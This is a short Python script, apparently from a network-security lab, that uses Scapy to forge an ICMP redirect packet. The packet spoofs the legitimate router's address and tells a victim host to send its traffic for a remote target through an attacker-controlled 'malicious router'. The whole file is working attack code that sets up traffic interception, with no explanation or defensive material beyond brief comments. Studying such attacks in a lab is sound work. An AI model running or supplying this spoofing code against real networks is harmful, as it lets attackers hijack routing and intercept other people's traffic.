#!/usr/bin/env python3
# Import Scapy library
from scapy.all import *

# Define IP and ICMP parameters
ip = IP(src="10.9.0.11", dst="10.9.0.5")  # Legitimate router IP to victim IP
icmp = ICMP(type=5, code=1)               # ICMP redirect message (Type 5, Code 1)
icmp.gw = "10.9.0.111"                    # Malicious router IP

# Encapsulate the original IP packet (victim -> target)
ip2 = IP(src="10.9.0.5", dst="192.168.60.5")

# Send crafted packet
send(ip/icmp/ip2/ICMP())